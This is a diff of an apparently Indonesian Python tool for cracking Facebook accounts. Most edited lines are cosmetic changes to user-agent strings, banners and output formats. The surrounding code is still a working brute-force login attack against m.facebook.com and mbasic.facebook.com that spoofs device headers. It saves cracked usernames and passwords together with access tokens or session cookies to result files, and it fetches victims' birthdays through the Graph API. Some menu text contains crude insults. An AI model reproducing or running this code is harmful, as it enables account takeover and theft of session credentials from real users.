@@ -53,7 +53,7 @@ def folder():
 	try:os.mkdir('data')
 	except:pass
 	try:
-		ua_ = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11;]'
+		ua_ = 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 635) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537;]'
 		open("data/ua.txt","w").write(ua_)
 	except:
 		pass
@@ -64,14 +64,14 @@ def banner():
 \x1b[0;93m  __   _  / __   \/  /__  _  ) __  ____/
 \x1b[0;93m   / ____/   / /\_/ /  / _  <   /  __/
 \x1b[0;93m  /_/       /_/  /_/  /_____/  /__/
-\x1b[0;97m#--------------------------------------#
+\x1b[0;97m#---------------------------------------#
 \x1b[0;93m• \x1b[0;97mCreate By : \x1b[0;93mAang Ardiansyah-XD
 \x1b[0;93m• \x1b[0;97mFacebook  : \x1b[0;93mFacebook.com/MyAangXd
 \x1b[0;93m• \x1b[0;97mGithub    : \x1b[0;93mGithub.com/AngCyber
-\x1b[0;97m#--------------------------------------#""")
+\x1b[0;97m#---------------------------------------#""")
 
 # MASUK TOKEN (TOKEN LISTRIK)
-header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
+header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 635) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 def masuk():
     os.system('clear');banner()
     print ('\n%s[1] Login pakai token \n[2] Cara mendapatkan token \n[%s0%s] Keluar \x1b[0;91m[Ahh Ngecrot]'%(P,M,P))
@@ -256,16 +256,16 @@ class ngentod:
                         else:
                             print ('\n %s[•] isi yang benar kentod'%(M));zona()
                     print '\n%s[ Silahkan pilih \x1b[0;93mmetode crack \x1b[0;97m]\n'%(P)
-                    print '\x1b[0;97m[%s1%s] Metode b-api [\x1b[0;92mCepet kaya rosi\x1b[0;97m]'%(K,P)
-                    print '[%s2%s] Metode mbasic [\x1b[0;92mLambat kaya disuruh emak\x1b[0;97m]'%(K,P)
-                    print '[%s3%s] Metode mobile fb [\x1b[0;92mSangat lambat kaya cewe\x1b[0;97m]'%(K,P)
+                    print '\x1b[0;97m[%s1%s] Metode b-api [\x1b[0;92mKenceng\x1b[0;97m]'%(K,P)
+                    print '[%s2%s] Metode mbasic [\x1b[0;92mMode Santuy\x1b[0;97m]'%(K,P)
+                    print '[%s3%s] Metode mobile fb [\x1b[0;92mIni Lambat Bego\x1b[0;97m]'%(K,P)
                     zona(pwx.split(','))
                     break
         elif unikers in ('T', 't'):
             print '\n%s[ Silahkan pilih \x1b[0;93mmetode crack \x1b[0;97m]\n'%(P)
-            print '\x1b[0;97m[%s1%s] Metode b-api [\x1b[0;92mCepet kaya rosi\x1b[0;97m]'%(K,P)
-            print '[%s2%s] Metode mbasic [\x1b[0;92mLambat kaya disuruh emak\x1b[0;97m]'%(K,P)
-            print '[%s3%s] Metode mobile fb [\x1b[0;92mSangat lambat kaya cewe\x1b[0;97m]'%(K,P)
+            print '\x1b[0;97m[%s1%s] Metode b-api [\x1b[0;92mKenceng\x1b[0;97m]'%(K,P)
+            print '[%s2%s] Metode mbasic [\x1b[0;92mMode Santuy\x1b[0;97m]'%(K,P)
+            print '[%s3%s] Metode mobile fb [\x1b[0;92mIni Lambat Bego\x1b[0;97m]'%(K,P)
             self.langsung()
         else:
             print("%s[•] Isi yang benar kentod"%(M));jeda(2);menu()
@@ -327,7 +327,7 @@ class ngentod:
     	try:
     	    ua = open('data/ua.txt', 'r').read()
         except IOError:
-        	ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1;]'
+        	ua = 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 635) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537;]'
         global ok,cp,loop
         for pw in zona:
             pw = pw.lower()
@@ -348,7 +348,7 @@ class ngentod:
                 sys.stdout.flush()
                 b_api(self, user, zona)
             if 'session_key' in response.text and 'EAAA' in response.text:
-                print '\r%sOK %s|%s|%s ' % (H,user,pw,response.json()['access_token'])
+                print '\r%s[OK] %s • %s • %s ' % (H,user,pw,response.json()['access_token'])
                 ok.append('%s • %s • %s' % (user,pw,response.json()['access_token']))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('[OK] %s • %s • %s\n'%(user,pw,response.json()['access_token']))
                 break
@@ -359,7 +359,7 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r%sCP %s|%s|%s %s %s  ' % (K,user,pw,day,month,year)
+                    print '\r%s[CP] %s • %s • %s %s %s  ' % (K,user,pw,day,month,year)
                     cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[CP] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
                     break
@@ -368,7 +368,7 @@ class ngentod:
                     month   = ''
                     year  = ''
                 except: pass
-                print '\r%sCP %s|%s           ' % (K,user,pw)
+                print '\r%s[CP] %s • %s           ' % (K,user,pw)
                 cp.append('%s • %s' % (user,pw))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[CP] %s • %s\n"%(user,pw))
                 break
@@ -381,7 +381,7 @@ class ngentod:
         try:
     	    ua = open('data/ua.txt', 'r').read()
         except IOError:
-        	ua = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11;]'
+        	ua = 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 635) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537;]'
         global ok,cp,loop
         for pw in zona:
             pw = pw.lower()
@@ -407,7 +407,7 @@ class ngentod:
             po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r%sOK %s|%s|%s  ' % (H,user,pw,kuki)
+                print '\r%s[OK] %s • %s • %s  ' % (H,user,pw,kuki)
                 ok.append("%s • %s • %s"% (user,pw,kuki))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[OK] %s • %s • %s\n"%(user,pw,kuki))
                 break
@@ -418,7 +418,7 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r%sCP %s|%s|%s %s %s ' % (K,user,pw,day,month,year)
+                    print '\r%s[CP] %s • %s • %s %s %s ' % (K,user,pw,day,month,year)
                     cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[CP] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
                     break
@@ -427,7 +427,7 @@ class ngentod:
                     month   = ''
                     year  = ''
                 except: pass
-                print '\r%sCP %s|%s            ' % (K,user,pw)
+                print '\r%s[CP] %s • %s            ' % (K,user,pw)
                 cp.append("%s • %s"% (user,pw))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[CP] %s • %s\n"%(user,pw))
                 break
@@ -440,7 +440,7 @@ class ngentod:
         try:
     	    ua = open('data/ua.txt', 'r').read()
         except IOError:
-        	ua = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11;]'
+        	ua = 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 635) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537;]'
         global ok,cp,loop
         for pw in zona:
             pw = pw.lower()
@@ -466,7 +466,7 @@ class ngentod:
             po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r%sOK %s|%s|%s ' % (H,user,pw,kuki)
+                print '\r%s[OK] %s • %s • %s ' % (H,user,pw,kuki)
                 ok.append("%s • %s • %s"% (user,pw,kuki))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Ok] %s • %s • %s\n"%(user,pw,kuki))
                 break
@@ -477,7 +477,7 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r%sCP %s|%s|%s %s %s ' % (K,user,pw,day,month,year)
+                    print '\r%s[CP] %s|%s|%s %s %s ' % (K,user,pw,day,month,year)
                     cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[CP] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
                     break
@@ -486,7 +486,7 @@ class ngentod:
                     month   = ''
                     year  = ''
                 except: pass
-                print '\r%sCP %s|%s              ' % (K,user,pw)
+                print '\r%s[CP] %s • %s              ' % (K,user,pw)
                 cp.append("%s • %s"% (user,pw))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[CP] %s • %s\n"%(user,pw))
                 break
@@ -592,7 +592,7 @@ def uas():
             	jalan("%s[•] Anda akan di arahkan ke browser ] "%(H));jeda(2)
             	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
             elif ua in("default","Default","DEFAULT"):
-                ua = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11;]'
+                ua = 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 635) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537'
                 open("data/ua.txt","w").write(ua_)
                 print ("\n%s[✓] Menggunakan user agent bawaan"%(H));jeda(2);menu()
             open("data/ua.txt","w").write(ua);jeda(2)
@@ -601,7 +601,7 @@ def uas():
 			exit ("\x1b[1;91m [!] "+er) 
     elif u in("2","02"):
         try:
-        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s╚═[%s•%s] user agent anda : %s%s"%(P,K,P,H,ua_));jeda(2);raw_input("\n%s [ %senter%s ] "%(P,K,P));menu()
+        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s[%s•%s] User agent kamu : %s%s"%(P,K,P,H,ua_));jeda(2);raw_input("\n%s[ %sEnter%s ] "%(P,K,P));menu()
         except IOError:
         	ua_ = '%s-'%(M)
     elif u in("0","00"):
